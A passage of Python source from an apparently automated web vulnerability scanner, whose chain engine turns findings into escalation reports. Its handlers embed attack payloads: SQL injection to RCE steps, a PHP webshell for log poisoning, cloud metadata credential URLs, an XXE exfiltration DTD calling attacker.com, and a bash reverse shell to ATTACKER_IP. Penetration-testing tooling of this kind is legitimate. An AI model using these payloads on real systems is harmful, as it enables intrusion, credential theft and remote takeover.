            # CMDi chains
            "cmdi_reverse_shell_prep": self._cmdi_reverse_shell_prep,
            "cmdi_data_exfiltration": self._cmdi_data_exfiltration,

            # Redirect chains
            "redirect_oauth_theft": self._redirect_oauth_theft,
            "redirect_phishing_demo": self._redirect_phishing_demo,

            # Info disclosure chains
            "info_cve_search": self._info_cve_search,
            "info_credential_search": self._info_credential_search,

            # ════════════════════════════════════════════════════════════════
            # AWS/CLOUDFRONT-SPECIFIC CHAIN HANDLERS
            # ════════════════════════════════════════════════════════════════
            "aws_credential_exploitation": self._aws_credential_exploitation,
            "cloudfront_origin_access": self._cloudfront_origin_access,
            "s3_data_exfiltration": self._s3_data_exfiltration,
            "ssrf_aws_imds_v2": self._ssrf_aws_imds_v2,
            "cloud_metadata_credential_theft": self._cloud_metadata_credential_theft,
            "api_key_account_takeover": self._api_key_account_takeover,

            # JWT chain handlers
            "jwt_algorithm_confusion": self._jwt_algorithm_confusion,
            "jwt_privilege_escalation": self._jwt_privilege_escalation,

            # CORS chain handlers
            "cors_credential_theft": self._cors_credential_theft,

            # Cache poisoning handlers
            "cache_stored_xss": self._cache_stored_xss,
            "cache_dos_chain": self._cache_dos_chain,

            # Speculative chain handlers
            "speculative_aws_attack_paths": self._speculative_aws_attack_paths,
            "speculative_api_attack_paths": self._speculative_api_attack_paths,

            # ════════════════════════════════════════════════════════════════
            # CROSS-MODULE CAUSAL CHAIN HANDLERS
            # ════════════════════════════════════════════════════════════════
            "xss_token_theft_chain": self._xss_token_theft_chain,
            "sqli_credential_auth_chain": self._sqli_credential_auth_chain,
            "nosql_auth_bypass_chain": self._nosql_auth_bypass_chain,
            "session_xss_ato_chain": self._session_xss_ato_chain,
            "business_idor_fraud_chain": self._business_idor_fraud_chain,
            "ssti_post_exploit_chain": self._ssti_post_exploit_chain,
            "xxe_credential_chain": self._xxe_credential_chain,

            # ════════════════════════════════════════════════════════════════
            # COMMUNICATIONS API CHAIN HANDLERS (Twilio, SendGrid, Authy)
            # ════════════════════════════════════════════════════════════════
            "comms_phone_enumeration_chain": self._comms_phone_enumeration_chain,
            "comms_sms_pumping_chain": self._comms_sms_pumping_chain,
            "comms_twilio_credential_chain": self._comms_twilio_credential_chain,
            "comms_sendgrid_credential_chain": self._comms_sendgrid_credential_chain,
            "comms_verify_abuse_chain": self._comms_verify_abuse_chain,
            "comms_auth_bypass_chain": self._comms_auth_bypass_chain,
            "speculative_comms_attack_paths": self._speculative_comms_attack_paths,
        }

    def set_context(self, **kwargs) -> None:
        """Set context for chain evaluation."""
        self.context.update(kwargs)

    def get_context(self) -> Dict[str, Any]:
        """Get current context."""
        return self.context.copy()

    async def process_finding(self, finding: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Process a finding and execute applicable chains.

        Args:
            finding: A vulnerability finding dict

        Returns:
            List of new findings from chain execution
        """
        # Generate finding ID to avoid reprocessing
        finding_id = self._generate_finding_id(finding)
        if finding_id in self.findings_processed:
            logger.debug(f"Finding already processed: {finding_id}")
            return []

        self.findings_processed.add(finding_id)

        # Determine trigger from finding type
        trigger = self._finding_to_trigger(finding)
        if not trigger:
            logger.debug(f"No chain trigger for finding type: {finding.get('type')}")
            return []

        # Update context from finding
        self._update_context_from_finding(finding)

        # Find applicable rules
        applicable_rules = self._get_applicable_rules(trigger)
        if not applicable_rules:
            logger.debug(f"No applicable chain rules for trigger: {trigger}")
            return []

        logger.info(f"🔗 Chain Engine: {len(applicable_rules)} rules triggered by {trigger.name}")

        # Execute chains in priority order
        all_chain_findings = []
        for rule in sorted(applicable_rules, key=lambda r: r.priority.value, reverse=True):
            try:
                result = await self._execute_chain(rule, finding)
                self.chain_results.append(result)

                if result.success and result.findings:
                    logger.info(f"  ✓ Chain '{rule.action}' found {len(result.findings)} new findings")
                    all_chain_findings.extend(result.findings)
            except Exception as e:
                logger.warning(f"  ✗ Chain '{rule.action}' failed: {e}")

        return all_chain_findings

    def _generate_finding_id(self, finding: Dict[str, Any]) -> str:
        """Generate unique ID for a finding."""
        import hashlib
        key = f"{finding.get('type')}:{finding.get('matched_at')}:{finding.get('evidence', '')}"
        return hashlib.md5(key.encode()).hexdigest()

    def _finding_to_trigger(self, finding: Dict[str, Any]) -> Optional[ChainTrigger]:
        """Map finding type to chain trigger."""
        vuln_type = finding.get("type", "").lower().replace(" ", "_").replace("-", "_")
        return self.VULN_TYPE_MAPPING.get(vuln_type)

    def _update_context_from_finding(self, finding: Dict[str, Any]) -> None:
        """Extract context information from finding, including rich extraction data."""
        metadata = finding.get("metadata", {})
        evidence_str = str(finding.get("evidence", "")).lower()

        # Extract database type from error messages or metadata
        if metadata.get("db_type"):
            self.context["db_type"] = metadata["db_type"]
        elif "error" in evidence_str:
            evidence = str(finding.get("evidence", ""))
            if "mysql" in evidence.lower():
                self.context["db_type"] = "mysql"
            elif "postgresql" in evidence.lower() or "postgres" in evidence.lower():
                self.context["db_type"] = "postgresql"
            elif "microsoft" in evidence.lower() or "mssql" in evidence.lower():
                self.context["db_type"] = "mssql"
            elif "oracle" in evidence.lower():
                self.context["db_type"] = "oracle"
            elif "sqlite" in evidence.lower():
                self.context["db_type"] = "sqlite"

        # Extract working payload if available
        if metadata.get("poc", {}).get("working_payload"):
            self.context["working_payload"] = metadata["poc"]["working_payload"]

        # Extract vulnerable endpoint
        if finding.get("matched_at"):
            self.context["vulnerable_endpoint"] = finding["matched_at"]

        # Extract any disclosed software versions
        if metadata.get("version"):
            self.context["disclosed_software"] = metadata["version"]

        # ═══════════════════════════════════════════════════════════════════
        # RICH METADATA EXTRACTION (from enhanced scanner modules)
        # ═══════════════════════════════════════════════════════════════════

        # SQLi extracted data (tables, credentials, DB version)
        extracted_data = metadata.get("extracted_data", {})
        if extracted_data:
            self.context["sqli_extracted_data"] = extracted_data
            # Check for extracted credentials
            if extracted_data.get("sample_data"):
                for table, rows in extracted_data["sample_data"].items():
                    if any(col in str(rows).lower() for col in ["password", "passwd", "hash", "secret", "token"]):
                        self.context["has_extracted_credentials"] = True
                        self.context["credential_table"] = table
                        self.context["credential_data"] = rows
                        break

        # NoSQL extracted data
        nosql_data = metadata.get("nosql_extracted_data", extracted_data)
        if nosql_data and finding.get("type", "").lower() in ("nosql_injection", "nosqli"):
            self.context["nosql_extracted_data"] = nosql_data

        # XXE file content
        file_content = metadata.get("file_content", "")
        if file_content:
            self.context["xxe_file_content"] = file_content
            # Check for credentials in extracted files
            content_lower = file_content.lower()
            if any(kw in content_lower for kw in ["password", "secret", "api_key", "token", "aws_"]):
                self.context["xxe_has_credentials"] = True
                self.context["xxe_credential_content"] = file_content

        # SSTI RCE output
        rce_output = metadata.get("rce_output", "")
        if rce_output:
            self.context["ssti_rce_output"] = rce_output
            self.context["ssti_has_rce"] = metadata.get("rce_confirmed", False)

        # XSS endpoint for cross-referencing
        vuln_type = finding.get("type", "").lower()
        if vuln_type in ("xss", "cross_site_scripting", "dom_xss", "reflected_xss", "stored_xss"):
            xss_endpoints = self.context.get("xss_endpoints", [])
            xss_endpoints.append({
                "url": finding.get("matched_at", ""),
                "type": vuln_type,
                "payload": metadata.get("poc", {}).get("working_payload", ""),
            })
            self.context["xss_endpoints"] = xss_endpoints

        # Session/JWT weakness data
        if vuln_type in ("session_abuse", "jwt_replay", "token_not_invalidated"):
            self.context["session_weakness_type"] = finding.get("name", vuln_type)
            self.context["has_session_weakness"] = True

        # Business logic data
        if vuln_type == "business_logic":
            biz_findings = self.context.get("business_logic_findings", [])
            biz_findings.append({
                "name": finding.get("name", ""),
                "endpoint": finding.get("matched_at", ""),
                "severity": finding.get("severity", ""),
            })
            self.context["business_logic_findings"] = biz_findings

    def _get_applicable_rules(self, trigger: ChainTrigger) -> List[ChainRule]:
        """Get rules applicable for a trigger given current context."""
        applicable = []

        for rule in self.CHAIN_RULES:
            if rule.trigger != trigger:
                continue

            # Check required context
            if rule.required_context:
                missing = rule.required_context - set(self.context.keys())
                if missing:
                    logger.debug(f"Rule '{rule.action}' missing context: {missing}")
                    continue

            # Check condition
            if rule.condition is not None:
                try:
                    if not rule.condition(self.context):
                        continue
                except Exception as e:
                    logger.debug(f"Rule '{rule.action}' condition failed: {e}")
                    continue

            applicable.append(rule)

        return applicable

    async def _execute_chain(self, rule: ChainRule, finding: Dict[str, Any]) -> ChainResult:
        """Execute a chain action."""
        import time
        start_time = time.time()

        handler = self._action_handlers.get(rule.action)
        if not handler:
            return ChainResult(
                success=False,
                action=rule.action,
                findings=[],
                evidence={},
                error=f"No handler for action: {rule.action}",
                execution_time=0.0,
            )

        try:
            findings = await asyncio.wait_for(
                handler(finding, self.context),
                timeout=rule.timeout
            )

            return ChainResult(
                success=True,
                action=rule.action,
                findings=findings,
                evidence={"trigger_finding": finding},
                execution_time=time.time() - start_time,
            )
        except asyncio.TimeoutError:
            return ChainResult(
                success=False,
                action=rule.action,
                findings=[],
                evidence={},
                error=f"Timeout after {rule.timeout}s",
                execution_time=rule.timeout,
            )
        except Exception as e:
            return ChainResult(
                success=False,
                action=rule.action,
                findings=[],
                evidence={},
                error=str(e),
                execution_time=time.time() - start_time,
            )

    # ============================================
    # Chain Action Handlers
    # ============================================

    async def _sqli_mysql_udf_rce(self, finding: Dict, context: Dict) -> List[Dict]:
        """MySQL UDF-based RCE attempt."""
        findings = []
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        working_payload = context.get("working_payload", "' OR '1'='1")

        # Check for FILE privilege
        file_check_payloads = [
            "' UNION SELECT LOAD_FILE('/etc/passwd')-- -",
            "' UNION SELECT @@plugin_dir-- -",
        ]

        findings.append({
            "type": "sqli_rce_chain",
            "name": "SQLi → MySQL UDF RCE Chain (Prepared)",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "SQL injection can potentially be escalated to RCE via MySQL UDF",
            "metadata": {
                "chain_type": "sqli_to_rce",
                "db_type": "mysql",
                "poc": {
                    "technique": "MySQL User Defined Function",
                    "steps": [
                        "1. Check FILE privilege: SELECT file_priv FROM mysql.user WHERE user=current_user()",
                        "2. Get plugin directory: SELECT @@plugin_dir",
                        "3. Write UDF shared object to plugin_dir",
                        "4. CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so'",
                        "5. SELECT sys_exec('id')",
                    ],
                    "requirements": ["FILE privilege", "Write access to plugin_dir"],
                    "working_payload": working_payload,
                },
            },
        })

        return findings

    async def _sqli_postgres_copy_rce(self, finding: Dict, context: Dict) -> List[Dict]:
        """PostgreSQL COPY TO PROGRAM RCE."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "sqli_rce_chain",
            "name": "SQLi → PostgreSQL COPY TO PROGRAM RCE Chain",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "SQL injection can be escalated to RCE via COPY TO PROGRAM",
            "metadata": {
                "chain_type": "sqli_to_rce",
                "db_type": "postgresql",
                "poc": {
                    "technique": "PostgreSQL COPY TO PROGRAM",
                    "payload": "'; COPY (SELECT '') TO PROGRAM 'id';--",
                    "steps": [
                        "1. Verify stacked queries work: '; SELECT pg_sleep(5);--",
                        "2. Execute command: '; COPY (SELECT '') TO PROGRAM 'id';--",
                        "3. For data exfil: COPY (SELECT pg_read_file('/etc/passwd')) TO PROGRAM 'curl ...'",
                    ],
                    "requirements": ["Stacked queries", "COPY privilege"],
                },
            },
        }]

    async def _sqli_mssql_xp_cmdshell(self, finding: Dict, context: Dict) -> List[Dict]:
        """MSSQL xp_cmdshell RCE."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "sqli_rce_chain",
            "name": "SQLi → MSSQL xp_cmdshell RCE Chain",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "SQL injection can be escalated to RCE via xp_cmdshell",
            "metadata": {
                "chain_type": "sqli_to_rce",
                "db_type": "mssql",
                "poc": {
                    "technique": "MSSQL xp_cmdshell",
                    "steps": [
                        "1. Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                        "2. Execute command: EXEC xp_cmdshell 'whoami';",
                        "3. If disabled, enable advanced options first: EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                    ],
                    "payload": "'; EXEC xp_cmdshell 'whoami';--",
                    "requirements": ["sysadmin role", "xp_cmdshell enabled"],
                },
            },
        }]

    async def _sqli_data_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
        """SQLi data extraction preparation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        db_type = context.get("db_type", "unknown")

        extraction_payloads = {
            "mysql": [
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,table_name FROM information_schema.columns--",
            ],
            "postgresql": [
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,table_name FROM information_schema.columns--",
            ],
            "mssql": [
                "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
                "' UNION SELECT name,object_id FROM sys.columns--",
            ],
        }

        return [{
            "type": "sqli_data_extraction_chain",
            "name": f"SQLi → Data Extraction Ready ({db_type})",
            "severity": "HIGH",
            "matched_at": endpoint,
            "url": endpoint,
            "confidence": 85,  # High confidence - derived from confirmed SQLi
            "description": "SQL injection confirmed - database schema extraction possible",
            "metadata": {
                "chain_type": "sqli_data_extraction",
                "db_type": db_type,
                "poc": {
                    "extraction_payloads": extraction_payloads.get(db_type, extraction_payloads["mysql"]),
                    "steps": [
                        "1. Enumerate tables: SELECT table_name FROM information_schema.tables",
                        "2. Enumerate columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'",
                        "3. Extract data: SELECT username, password FROM users",
                    ],
                },
            },
        }]

    async def _sqli_file_read(self, finding: Dict, context: Dict) -> List[Dict]:
        """SQLi file read capability."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        db_type = context.get("db_type", "unknown")

        file_read_methods = {
            "mysql": "LOAD_FILE('/etc/passwd')",
            "postgresql": "pg_read_file('/etc/passwd')",
            "mssql": "OPENROWSET(BULK 'C:\\boot.ini', SINGLE_CLOB) AS Contents",
        }

        return [{
            "type": "sqli_file_read_chain",
            "name": f"SQLi → File Read Capability ({db_type})",
            "severity": "HIGH",
            "matched_at": endpoint,
            "url": endpoint,
            "confidence": 80,  # High confidence - derived from confirmed SQLi
            "description": "SQL injection may allow reading server files",
            "metadata": {
                "chain_type": "sqli_file_read",
                "db_type": db_type,
                "poc": {
                    "method": file_read_methods.get(db_type, "LOAD_FILE()"),
                    "target_files": ["/etc/passwd", "/etc/shadow", "/var/www/.env", "C:\\boot.ini"],
                },
            },
        }]

    async def _lfi_extract_passwd(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI /etc/passwd extraction."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        working_payload = context.get("working_payload", "../../../etc/passwd")

        return [{
            "type": "lfi_extraction_chain",
            "name": "LFI → System Files Extraction",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": endpoint,
            "description": "LFI confirmed - extracting sensitive system files",
            "metadata": {
                "chain_type": "lfi_extraction",
                "poc": {
                    "working_payload": working_payload,
                    "target_files": [
                        "/etc/passwd",
                        "/etc/shadow",
                        "/etc/hosts",
                        "/proc/self/environ",
                        "/proc/self/cmdline",
                        "/var/log/auth.log",
                    ],
                },
            },
        }]

    async def _lfi_extract_config(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI config file extraction."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        technologies = context.get("technologies", [])

        config_files = [
            "/.env",
            "/config/database.yml",
            "/config/secrets.yml",
            "/app/config/parameters.yml",
        ]

        if "php" in technologies:
            config_files.extend(["/wp-config.php", "/configuration.php", "/config.php"])
        if "python" in technologies:
            config_files.extend(["/settings.py", "/local_settings.py"])
        if "java" in technologies:
            config_files.extend(["/application.properties", "/application.yml"])

        return [{
            "type": "lfi_config_extraction_chain",
            "name": "LFI → Application Config Extraction",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "LFI can extract application configuration with credentials",
            "metadata": {
                "chain_type": "lfi_config_extraction",
                "poc": {
                    "target_files": config_files,
                    "expected_secrets": ["database_password", "api_keys", "jwt_secret"],
                },
            },
        }]

    async def _lfi_php_wrappers(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI PHP wrapper exploitation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "lfi_php_wrapper_chain",
            "name": "LFI → PHP Filter Source Code Disclosure",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "LFI with PHP allows source code extraction via php://filter",
            "metadata": {
                "chain_type": "lfi_php_wrapper",
                "poc": {
                    "payload": "php://filter/convert.base64-encode/resource=index.php",
                    "steps": [
                        "1. Use php://filter to encode source code",
                        "2. Base64 decode the response to get source",
                        "3. Search for hardcoded credentials, API keys, DB passwords",
                    ],
                    "rce_payload": "php://input with POST body: <?php system($_GET['cmd']); ?>",
                },
            },
        }]

    async def _lfi_log_poisoning(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI log poisoning for RCE."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "lfi_log_poisoning_chain",
            "name": "LFI → Log Poisoning RCE",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "LFI can be escalated to RCE via log poisoning",
            "metadata": {
                "chain_type": "lfi_log_poisoning_rce",
                "poc": {
                    "steps": [
                        "1. Send malicious User-Agent: <?php system($_GET['cmd']); ?>",
                        "2. Include access log: ../../../var/log/apache2/access.log",
                        "3. Add ?cmd=id to execute commands",
                    ],
                    "log_files": [
                        "/var/log/apache2/access.log",
                        "/var/log/nginx/access.log",
                        "/var/log/httpd/access_log",
                        "/proc/self/fd/1",
                    ],
                },
            },
        }]

    async def _lfi_proc_environ(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI /proc/self/environ exploitation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "lfi_proc_chain",
            "name": "LFI → /proc/self/environ Secrets",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": endpoint,
            "description": "LFI can read process environment variables for secrets",
            "metadata": {
                "chain_type": "lfi_proc_environ",
                "poc": {
                    "payload": "../../../proc/self/environ",
                    "expected_secrets": ["AWS_SECRET_ACCESS_KEY", "DATABASE_URL", "API_KEY"],
                },
            },
        }]

    async def _idor_enumerate_ids(self, finding: Dict, context: Dict) -> List[Dict]:
        """IDOR ID enumeration."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "idor_enumeration_chain",
            "name": "IDOR → Mass ID Enumeration",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": endpoint,
            "description": "IDOR allows enumerating all accessible resources",
            "metadata": {
                "chain_type": "idor_enumeration",
                "poc": {
                    "enumeration_range": "1-10000",
                    "steps": [
                        "1. Identify ID parameter pattern",
                        "2. Enumerate IDs: 1, 2, 3, ..., 10000",
                        "3. Collect all accessible records",
                        "4. Report total data exposure",
                    ],
                },
            },
        }]

    async def _idor_horizontal_escalation(self, finding: Dict, context: Dict) -> List[Dict]:
        """IDOR horizontal privilege escalation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "idor_horizontal_chain",
            "name": "IDOR → Horizontal Privilege Escalation",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": endpoint,
            "description": "IDOR allows accessing other users' data at same privilege level",
            "metadata": {
                "chain_type": "idor_horizontal",
                "poc": {
                    "steps": [
                        "1. Identify user-specific resource (e.g., /api/user/123/profile)",
                        "2. Change ID to another user (e.g., /api/user/456/profile)",
                        "3. Access data belonging to other users",
                    ],
                },
            },
        }]

    async def _idor_vertical_escalation(self, finding: Dict, context: Dict) -> List[Dict]:
        """IDOR vertical privilege escalation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "idor_vertical_chain",
            "name": "IDOR → Vertical Privilege Escalation",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "IDOR may allow accessing admin/privileged resources",
            "metadata": {
                "chain_type": "idor_vertical",
                "poc": {
                    "admin_ids_to_try": ["1", "0", "admin", "root"],
                    "admin_endpoints": ["/admin", "/api/admin", "/api/users/1"],
                },
            },
        }]

    async def _auth_test_admin_endpoints(self, finding: Dict, context: Dict) -> List[Dict]:
        """Test admin endpoints after auth bypass."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "auth_bypass_admin_chain",
            "name": "Auth Bypass → Admin Functionality Access",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "Authentication bypass enables testing admin functionality",
            "metadata": {
                "chain_type": "auth_to_admin",
                "poc": {
                    "admin_endpoints_to_test": [
                        "/admin",
                        "/admin/users",
                        "/admin/settings",
                        "/api/admin/users",
                        "/dashboard",
                    ],
                },
            },
        }]

    async def _auth_enumerate_users(self, finding: Dict, context: Dict) -> List[Dict]:
        """Enumerate users after auth bypass."""
        return [{
            "type": "auth_bypass_enum_chain",
            "name": "Auth Bypass → User Enumeration",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "auth_to_enum",
                "poc": {
                    "enumeration_endpoints": ["/api/users", "/api/admin/users", "/users/list"],
                },
            },
        }]

    async def _default_creds_authenticated_scan(self, finding: Dict, context: Dict) -> List[Dict]:
        """Run authenticated scan with default credentials."""
        return [{
            "type": "default_creds_chain",
            "name": "Default Credentials → Authenticated Scan Ready",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": context.get("vulnerable_endpoint"),
            "description": "Default credentials allow full authenticated testing",
            "metadata": {
                "chain_type": "creds_to_auth_scan",
                "poc": {
                    "steps": [
                        "1. Authenticate with discovered credentials",
                        "2. Re-run all scanners with authenticated session",
                        "3. Test privileged functionality",
                    ],
                },
            },
        }]

    async def _ssrf_cloud_metadata(self, finding: Dict, context: Dict) -> List[Dict]:
        """SSRF cloud metadata extraction."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "ssrf_cloud_metadata_chain",
            "name": "SSRF → Cloud Metadata Extraction",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "description": "SSRF can extract cloud provider metadata and credentials",
            "metadata": {
                "chain_type": "ssrf_cloud_metadata",
                "poc": {
                    "aws_endpoints": [
                        "http://169.254.169.254/latest/meta-data/",
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "http://169.254.169.254/latest/user-data",
                    ],
                    "gcp_endpoints": [
                        "http://metadata.google.internal/computeMetadata/v1/",
                        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                    ],
                    "azure_endpoints": [
                        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                        "http://169.254.169.254/metadata/identity/oauth2/token",
                    ],
                },
            },
        }]

    async def _ssrf_internal_port_scan(self, finding: Dict, context: Dict) -> List[Dict]:
        """SSRF internal port scan."""
        return [{
            "type": "ssrf_port_scan_chain",
            "name": "SSRF → Internal Port Scan",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "ssrf_port_scan",
                "poc": {
                    "scan_targets": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
                    "common_ports": [22, 80, 443, 3306, 5432, 6379, 27017, 8080],
                },
            },
        }]

    async def _ssrf_internal_services(self, finding: Dict, context: Dict) -> List[Dict]:
        """SSRF internal services access."""
        return [{
            "type": "ssrf_internal_services_chain",
            "name": "SSRF → Internal Services Access",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "ssrf_internal_services",
                "poc": {
                    "services_to_target": {
                        "redis": "http://127.0.0.1:6379/",
                        "elasticsearch": "http://127.0.0.1:9200/_cat/indices",
                        "mongodb": "http://127.0.0.1:27017/",
                        "consul": "http://127.0.0.1:8500/v1/agent/members",
                    },
                },
            },
        }]

    async def _xxe_file_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
        """XXE file extraction."""
        return [{
            "type": "xxe_file_extraction_chain",
            "name": "XXE → Sensitive File Extraction",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "xxe_file_read",
                "poc": {
                    "target_files": ["/etc/passwd", "/etc/shadow", "/.env", "/var/www/config.php"],
                    "payload_template": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}">]><foo>&xxe;</foo>',
                },
            },
        }]

    async def _xxe_ssrf(self, finding: Dict, context: Dict) -> List[Dict]:
        """XXE to SSRF."""
        return [{
            "type": "xxe_ssrf_chain",
            "name": "XXE → SSRF to Internal Services",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "xxe_ssrf",
                "poc": {
                    "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
                },
            },
        }]

    async def _xxe_oob_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
        """XXE out-of-band exfiltration."""
        return [{
            "type": "xxe_oob_chain",
            "name": "XXE → Out-of-Band Data Exfiltration",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "xxe_oob",
                "poc": {
                    "technique": "External DTD with parameter entities",
                    "steps": [
                        "1. Host malicious DTD: <!ENTITY % data SYSTEM 'file:///etc/passwd'>",
                        "2. DTD sends data: <!ENTITY % exfil '<!ENTITY &#37; send SYSTEM \"http://attacker.com/?d=%data;\">'>",
                        "3. Trigger with: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>",
                    ],
                },
            },
        }]

    # Placeholder implementations for remaining handlers
    async def _deser_java_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_java_chain",
            "name": "Java Deserialization → ysoserial RCE",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "java_deser_rce", "poc": {"tool": "ysoserial"}},
        }]

    async def _deser_php_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_php_chain",
            "name": "PHP Deserialization → Object Injection RCE",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "php_deser_rce", "poc": {"tool": "phpggc"}},
        }]

    async def _deser_python_pickle(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_python_chain",
            "name": "Python Pickle → RCE",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "python_pickle_rce"},
        }]

    async def _deser_dotnet_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_dotnet_chain",
            "name": ".NET Deserialization → ysoserial.net RCE",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "dotnet_deser_rce", "poc": {"tool": "ysoserial.net"}},
        }]

    async def _ssti_rce(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "ssti_rce_chain",
            "name": "SSTI → Template Engine RCE",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "ssti_rce"},
        }]

    async def _cmdi_reverse_shell_prep(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "cmdi_revshell_chain",
            "name": "Command Injection → Reverse Shell Prepared",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "cmdi_revshell",
                "poc": {
                    "bash_revshell": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                    "python_revshell": "python -c 'import socket,subprocess,os;...'",
                },
            },
        }]

    async def _cmdi_data_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "cmdi_exfil_chain",
            "name": "Command Injection → Data Exfiltration",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "cmdi_exfil"},
        }]

    async def _redirect_oauth_theft(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "redirect_oauth_chain",
            "name": "Open Redirect → OAuth Token Theft",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "redirect_oauth"},
        }]

    async def _redirect_phishing_demo(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "redirect_phishing_chain",
            "name": "Open Redirect → Phishing Chain",
            "severity": "MEDIUM",
            "confidence": 75,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "redirect_phishing"},
        }]

    async def _info_cve_search(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "info_cve_chain",
            "name": "Version Disclosure → CVE Search",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "version_to_cve"},
        }]

    async def _info_credential_search(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "info_creds_chain",
            "name": "Source Code Disclosure → Credential Search",
            "severity": "CRITICAL",
            "confidence": 90,
